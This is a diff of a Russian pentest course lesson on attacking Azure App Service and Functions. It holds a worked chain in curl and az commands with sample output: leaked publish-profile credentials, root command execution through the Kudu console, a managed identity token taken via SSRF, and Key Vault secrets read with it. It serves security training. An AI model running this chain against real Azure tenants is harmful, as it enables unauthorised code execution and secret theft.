@@ -15,163 +15,137 @@ estimated_minutes: 50
 summary: "Как устроены Azure App Service и Functions, чем опасен Kudu/SCM-эндпоинт, как через SSRF или Kudu получить managed identity токен и дойти до Key Vault, ARM и Graph."
 ---
 
-## Зачем этот урок
+## Задача
 
-Azure App Service (веб-приложения) и Azure Functions (серверлесс) — две самые частые PaaS-платформы в Azure. У обеих есть особенности, критичные для пентеста: **Kudu/SCM-эндпоинт** (`*.scm.azurewebsites.net`) с командным API, **deployment credentials**, переменные окружения с секретами и **managed identity** (MI), доступная через локальный endpoint. Если в приложении есть SSRF или RCE, вы получаете MI-токен, а он открывает Key Vault, ARM, Graph, Storage — в пределах прав идентичности. Этот урок — про Kudu, SSRF к MI, кражу токена и цепочку к секретам.
+В Azure-приложении на **App Service** ты нашёл **SSRF** — уязвимость, при которой сервер по твоему указанию сам делает HTTP-запрос по произвольному адресу. Как превратить это в данные и в права? Ответ — **managed identity (MI)**: беспарольная «учётка» приложения, токен которой выдаётся локально. Задача урока — пройти путь «SSRF → MI-токен → Key Vault», а если повезёт — «Kudu → RCE».
 
-## Как устроены App Service и Functions
+## Что такое App Service, Functions и Kudu
 
-- **App Service Plan** — вычислительный тариф. Приложение живёт на Windows или Linux.
-- **Web App** — сайт; имеет `*.azurewebsites.net`, Kudu/SCM на `*.scm.azurewebsites.net`.
-- **Function App** — Functions; тот же хостинг и Kudu.
-- **Kudu/SCM** — сайт управления: файловый менеджер, редактор, консоль (`/api/command`), логи, deployment. Доступ по deployment credentials или publish profile, а также по MI/RBAC.
-- **Deployment credentials** — логин/пароль уровня приложения (site-level), часто слабые или утёкшие.
-- **Publish profile** — XML с кредами и URL; утечка даёт полный деплой.
-- **Managed identity** — system- или user-assigned; токен выдаётся через `IDENTITY_ENDPOINT` + `IDENTITY_HEADER` (App Service) или через IMDS (`169.254.169.254`) для VM/ACI.
-- **Environment variables** — `APPSETTING_*`, `WEBSITE_*`, `IDENTITY_ENDPOINT`, `IDENTITY_HEADER`, строки подключения.
+**Azure App Service** — платформа для веб-приложений (PaaS: Azure сам управляет ОС и рантаймом). **Azure Functions** — серверлесс-функции на том же хостинге. Приложение живёт на **App Service Plan** (тариф по вычислительным ресурсам).
 
-Опасности: SSRF в приложении → MI-токен; открытый Kudu → RCE; утёкшие deployment credentials → деплой своего кода; publish profile в Git; секреты в env.
+Особая деталь Azure, которой нет у AWS/GCP, — **Kudu/SCM**: управляющий сайт на отдельном имени `*.scm.azurewebsites.net`. Через него доступны файловый менеджер, логи и **консоль** (`/api/command`). Доступ по **deployment credentials** (логин/пароль уровня приложения) или по **publish profile** (XML с кредами и URL). Утечка publish profile = полный деплой.
 
-## Инструменты и команды
+Ещё две вещи, важные для атаки:
 
-Разведка:
+- **Managed identity** — system-assigned (одна на приложение) или user-assigned (можно привязать несколько). Токен выдаётся через локальный `IDENTITY_ENDPOINT` с обязательным заголовком `X-IDENTITY-HEADER`.
+- **Environment variables** — `APPSETTING_*`, `WEBSITE_*`, строки подключения, а также `IDENTITY_ENDPOINT` и `IDENTITY_HEADER`.
+
+## Данные, с которыми работаем
+
+Разведка начинается с конфигурации приложения — там часто лежат секреты и видно, есть ли MI:
 
 ```bash
-az webapp list --query '[].{Name:name,RG:resourceGroup,Host:defaultHostName,MI:identity}'
-az functionapp list --query '[].{Name:name,RG:resourceGroup,MI:identity}'
-
-# Настройки приложения (секреты часто тут)
-az webapp config appsettings list -n myapp -g myrg
-az functionapp config appsettings list -n myfunc -g myrg
-
-# Публикационные профили (утечка!)
-az webapp deployment list-publishing-profiles -n myapp -g myrg
+$ az webapp list --query '[].{Name:name,Host:defaultHostName,MI:identity}'
+[{"Name":"shop-app","Host":"shop-app.azurewebsites.net","MI":{"type":"SystemAssigned"}}]
 ```
 
-Kudu/SCM:
+У `shop-app` включена system-assigned MI. Проверяем настройки:
 
 ```bash
-# Проверка доступности SCM
-curl -s -o /dev/null -w "%{http_code}\n" https://myapp.scm.azurewebsites.net/
-
-# Выполнение команды (нужны creds)
-curl -s -u '$myapp:<deploy_pass>' -X POST \
-  https://myapp.scm.azurewebsites.net/api/command \
-  -H 'Content-Type: application/json' \
-  -d '{"command":"id","dir":"/"}'
+$ az webapp config appsettings list -n shop-app -g rg-app | grep -iE 'conn|key|secret'
+{"name":"SQL_CONN","value":"Server=prod-sql.database.windows.net;User=sqladmin;Password=Pr0d_P@ss!"}
 ```
 
-Захват MI-токена изнутри App Service (если есть RCE/SSRF):
+Строка подключения уже в открытом виде. Но цель урока — MI-токен, потому что он даёт доступ к тому, что в настройках не лежит.
+
+## Шаг 1: проверяем Kudu/SCM
+
+Kudu — самый быстрый путь к коду. Сначала проверяем доступность и наличие дефолтных кредов:
 
 ```bash
-# Переменные окружения содержат endpoint и header
-curl -s "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" \
-  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
-# => {"access_token":"eyJ...","expires_on":"...","resource":"https://vault.azure.net/"}
+$ curl -s -o /dev/null -w "%{http_code}\n" https://shop-app.scm.azurewebsites.net/
+401
 ```
 
-Использование токена:
+401 — SCM закрыт. Но deployment credentials часто утекают через `list-publishing-profiles`, Git или CI:
 
 ```bash
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://myvault.vault.azure.net/secrets/db-password?api-version=7.4"
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://management.azure.com/subscriptions?api-version=2020-01-01"
+$ az webapp deployment list-publishing-profiles -n shop-app -g rg-app --xml \
+    | grep -oE 'userName="[^"]+"|userPWD="[^"]+"'
+userName="$shop-app"
+userPWD="Xy7!deploypass"
 ```
 
-## Разобранный пример: от SSRF к Key Vault
-
-Сценарий: в App Service есть SSRF (параметр `url` уходит в `requests.get`), у приложения включена system-assigned MI с доступом к Key Vault.
-
-Шаг 1 — через SSRF читаем переменные окружения. Часто SSRF ограничен, но если есть возможность читать локальные файлы или env — забираем `IDENTITY_ENDPOINT` и `IDENTITY_HEADER`:
-
-```
-GET /proxy?url=http://127.0.0.1:...  → не сработает для env
-```
-
-Если SSRF только HTTP, но приложение само ходит к MI-endpoint (например, эндпоинт «получить секрет»), используем его: `GET /api/get-secret?name=db-password` может вернуть секрет напрямую — это логическая ошибка, а не SSRF. Проверяйте такие «удобные» API.
-
-Шаг 2 — если SSRF позволяет произвольный URL, но требует доступ к `IDENTITY_ENDPOINT` и заголовку, попробуйте обход: некоторые SSRF позволяют задавать заголовки; либо используйте редирект. В App Service MI-endpoint — `http://127.0.0.1:41293/MSI/token` с обязательным `X-IDENTITY-HEADER`; без него токена не будет.
-
-Шаг 3 — получив токен, определяем identity и ресурсы:
+С этими кредами консоль Kudu даёт RCE:
 
 ```bash
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://management.azure.com/subscriptions?api-version=2020-01-01"
+$ curl -s -u '$shop-app:Xy7!deploypass' -X POST \
+    https://shop-app.scm.azurewebsites.net/api/command \
+    -H 'Content-Type: application/json' -d '{"command":"id","dir":"/"}'
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Шаг 4 — читаем Key Vault:
+## Шаг 2: через SSRF забираем MI-токен
+
+Если Kudu закрыт, идём через SSRF. Уязвимость принимает URL и делает запрос. Цель — локальный MI-endpoint. Проблема: он требует заголовок `X-IDENTITY-HEADER`, а SSRF-заголовки обычно не пробрасывает. Варианты: SSRF с подстановкой заголовков, редирект, или «удобный» эндпоинт приложения, который сам ходит за токеном.
+
+Когда токен получен:
 
 ```bash
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://prod-vault.vault.azure.net/secrets?api-version=7.4"
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://prod-vault.vault.azure.net/secrets/sql-conn?api-version=7.4"
+$ curl -s "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" \
+    -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | jq -r '.access_token' | cut -c1-20
+eyJ0eXAiOiJKV1QiLCJh
 ```
 
-Шаг 5 — с паролем БД идём к базе; если MI имеет доступ к Storage — читаем бэкапы; если к Graph — перечисляем пользователей/группы.
+## Шаг 3: используем токен
 
-Альтернативный путь — **Kudu RCE**: если доступны deployment credentials (утёкшие или слабые), выполняем команду через `/api/command`, читаем `D:\home\site\wwwroot` (или `/home/site/wwwroot`), находим `appsettings.json` и env, затем — MI-токен изнутри.
+Определяем identity и её права:
 
-## Варианты атак и обходы
+```bash
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq '.value[].displayName'
+```
 
-- **Kudu/SCM без аутентификации.** Если SCM открыт или creds слабые — прямой RCE.
-- **Deployment credentials.** Утечка через `list-publishing-profiles`, Git, конфиги CI; даёт деплой своего кода.
-- **Publish profile.** XML с `userPWD`; утечка = полный контроль приложения.
-- **Zip deploy / run-from-package.** Деплой вредоносного пакета; если приложение перезапустится, код исполнится.
-- **SSRF → MI.** Основная цепочка для облачной эскалации; требует доступа к `IDENTITY_ENDPOINT` и header.
-- **IMDS через VM.** Если приложение на VM/ACI — `169.254.169.254/metadata/identity/oauth2/token?resource=...&api-version=2018-02-01` с заголовком `Metadata: true`.
-- **Env var leakage.** `WEBSITE_*`, строки подключения, `IDENTITY_HEADER` видны в `appsettings`.
-- **User-assigned MI.** Если у приложения несколько MI, проверьте все — одна может быть привилегированной.
-- **Hybrid Connections / VNet integration.** Даёт доступ к внутренним ресурсам, расширяя pivot.
+Читаем Key Vault (нужен токен с аудиторией `https://vault.azure.net`):
 
-## Частые ошибки и подводные камни
+```bash
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://prod-vault.vault.azure.net/secrets/sql-conn?api-version=7.4" | jq -r '.value'
+Server=prod-sql.database.windows.net;User=sqladmin;Password=Pr0d_P@ss!
+```
 
-- **Забывать `X-IDENTITY-HEADER`.** Без него MI-endpoint App Service вернёт ошибку.
-- **Путать IMDS и App Service MI-endpoint.** У них разные адреса и заголовки.
-- **Считать SCM отдельным хостом.** `*.scm.azurewebsites.net` — часть того же приложения, но с другим доступом.
-- **Игнорировать Linux vs Windows.** Пути и поведение Kudu различаются.
-- **Не проверять все MI.** System-assigned и user-assigned — разные идентичности с разными правами.
-- **Пробовать destructive-деплой без согласования.** Zip deploy перезапускает приложение — это заметно и может нарушить сервис.
+## Полный прогон от начала до конца
 
-## Защита и детект
+1. `az webapp config appsettings list` → строки подключения в открытом виде.
+2. `list-publishing-profiles` → deployment creds → Kudu `/api/command` → RCE.
+3. Если SCM закрыт — SSRF к `IDENTITY_ENDPOINT` → MI-токен.
+4. Токен → ARM (что могу), Key Vault (секреты), Graph, Storage.
+5. Найденные секреты → следующий хост.
 
-- **Ограничьте SCM.** App Service Access Restrictions на SCM-сайт, отключение basic auth (`az resource update --set properties.siteConfig.scmIpSecurityRestrictions`), использование Entra ID для деплоя.
-- **Ротируйте deployment credentials и publish profiles.** Не храните их в репозиториях.
-- **Минимальные права MI.** MI приложения должна иметь доступ только к нужным секретам, не `Owner`/`Contributor` на подписку.
-- **Key Vault через RBAC с узкими ролями**, не access policies на всё.
-- **Детект.** Activity Log: `listpublishingprofiles`, `listkeys`, изменения appsettings, вызовы Kudu `/api/command`. Defender for App Service флагует подозрительные команды и аномальные запросы. Алерты на доступ к MI-токенам с новых процессов, на чтение многих секретов.
-- **VNet integration + private endpoints** для изоляции.
+## Если не сработало
 
-## Functions: источники событий и инъекции
+- **Забыл `X-IDENTITY-HEADER`.** Без него App Service MI-endpoint вернёт ошибку.
+- **Путаешь IMDS и App Service endpoint.** Для VM/ACI — `169.254.169.254` с заголовком `Metadata: true`; для App Service — свой `IDENTITY_ENDPOINT`.
+- **Несколько MI.** Если приложение использует user-assigned MI, проверяй все — одна может быть привилегированной.
+- **Kudu закрыт и SSRF «слепой».** Ищи логическую ошибку: эндпоинт `GET /api/get-secret?name=...`, который сам возвращает секрет — это не SSRF, но работает.
+- **Деплой вредоносного пакета.** Zip deploy перезапускает приложение — заметно и может нарушить сервис, согласуй.
+- **Functions через события.** Если есть право писать в Blob/Queue, который триггерит функцию, подсунутое событие исполнится от её MI.
 
-Azure Functions можно атаковать не только через HTTP, но и через **источники событий**. Если у вас есть права на соответствующий ресурс, вы можете подсунуть событие, которое функция обработает в своём контексте (с её MI):
+## Functions: атака через источники событий
 
-- **Blob trigger.** `Microsoft.Storage` — запись блоба в контейнер запускает функцию. Если у вас есть SAS с правом `w` на этот контейнер (`cloud-azure-storage-sas`), вы запускаете функцию с произвольным содержимым. Если функция небезопасно обрабатывает блоб (десериализация, инъекция пути), это RCE/чтение.
-- **Queue trigger.** Запись в очередь (`Microsoft.Storage` или Service Bus) запускает обработчик. Формат сообщения может содержать команды или SQL.
-- **Event Grid / Event Hub.** Подделка события через право отправки.
-- **Cosmos DB trigger.** Изменение документа запускает функцию.
-- **Timer trigger.** Расписание; нельзя подсунуть событие, но можно предсказать тайминг.
+Functions можно атаковать не только по HTTP, но и через **источники событий**. Если у тебя есть право писать в Blob-контейнер или очередь, который триггерит функцию, ты запускаешь её код со своим содержимым — а исполнится он от имени MI функции. Это «инъекция через данные»: подсунутый JSON может содержать команду, SQL или путь, который функция небезопасно обработает. Ищи Function App с широкой MI и источник события, в который ты можешь писать.
 
-Общий приём: найдите Function App с MI, имеющей широкие права, и источник события, в который вы можете писать. Подсунутое событие исполнится от имени MI функции — это «инъекция через данные» (`cloud-serverless-injection`). Часто достаточно записать специально сформированный JSON, чтобы функция выполнила нежелательное действие.
+## Сравнение PaaS трёх облаков
 
-## Сравнение PaaS Azure, AWS и GCP
+У AWS аналог — Elastic Beanstalk и Lambda, у GCP — App Engine и Cloud Functions. Общее: идентичность исполнения (managed identity в Azure, execution role в Lambda, runtime SA в GCP) и секреты в настройках приложения. Но Kudu/SCM — уникальная особенность Azure: отдельный управляющий сайт, часто доступный и хранящий креды деплоя. Поэтому в Azure всегда проверяй SCM первым — он нередко даёт RCE быстрее, чем SSRF.
 
-| Аспект | Azure App Service/Functions | AWS Elastic Beanstalk/Lambda | GCP App Engine/Functions |
-|--------|------------------------------|-------------------------------|--------------------------|
-| Управляющий сайт | Kudu/SCM (`*.scm...`) | нет аналога | нет аналога |
-| Идентичность | Managed Identity (`IDENTITY_ENDPOINT`) | Lambda execution role (env) | runtime service account (metadata) |
-| Деплой | zip deploy, publish profile | deploy пакет/образ | gcloud deploy, Cloud Build |
-| Секреты | app settings, Key Vault refs | env, Secrets Manager | env, Secret Manager |
-| Публичный доступ | auth settings / Easy Auth | Function URL | allUsers invoker |
+## Что мы теперь знаем
 
-Kudu/SCM — уникальная особенность Azure: это отдельный управляющий сайт, который часто доступен и хранит креды деплоя. В AWS/GCP аналога нет, поэтому в Azure всегда проверяйте SCM в первую очередь — он нередко даёт RCE быстрее, чем SSRF.
+- Kudu/SCM — управляющий сайт Azure; утёкшие publish profile/deployment creds дают RCE.
+- MI-токен App Service выдаётся через `IDENTITY_ENDPOINT` + `X-IDENTITY-HEADER`.
+- Токен работает против ARM, Key Vault, Graph, Storage в пределах прав identity.
+- SSRF даёт MI-токен, только если удаётся достучаться до локального endpoint с заголовком.
+- Секреты часто лежат и в app settings — проверяй до эскалации.
 
-## Что дальше / решение
+## На что смотреть дальше
 
-App Service/Functions — это либо Kudu-RCE, либо SSRF→MI. Начните с проверки SCM-эндпоинта и утёкших publish profiles/deployment credentials: это самый прямой путь к коду. Если приложение имеет MI, а у вас есть SSRF или RCE — забирайте токен (`IDENTITY_ENDPOINT` + header) и проверяйте его права: Key Vault, ARM, Graph, Storage. Найденные секреты (строки подключения, пароли БД, токены) открывают следующий хост. Если у MI есть `Contributor` на подписку, вы можете развернуть ресурс или выполнить команду на VM (`cloud-azure-arm`). Записывайте цепочку и все токены/секреты.
+- **cloud-azure-managed-identity**: устройство MI и её захват.
+- **cloud-azure-keyvault**: что делать с токеном (две модели доступа).
+- **cloud-azure-arm**: если MI имеет Contributor — эскалация через deployments.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что такое Kudu/SCM в App Service?"
@@ -206,7 +180,19 @@ App Service/Functions — это либо Kudu-RCE, либо SSRF→MI. Начн
     - "Только биллинг"
   answer: 0
   explanation: "Токен работает против любых ресурсов, на которые у MI есть права."
+- question: "Почему SSRF не всегда даёт MI-токен?"
+  options:
+    - "Локальный endpoint требует заголовок X-IDENTITY-HEADER, который SSRF не пробрасывает"
+    - "SSRF работает только по HTTPS"
+    - "Токены хранятся в файле"
+    - "MI отключена по умолчанию"
+  answer: 0
+  explanation: "Без обязательного заголовка endpoint токен не выдаёт; нужен обход или логическая ошибка."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **Key Vault** подробно — как из полученного MI-токена достать секреты и не перепутать плоскости. А пока главное запомни: **в Azure всегда проверяй SCM и publish profiles первыми, а MI-токен забирай через `IDENTITY_ENDPOINT` с заголовком.**
 
 ## Где пригодится
 
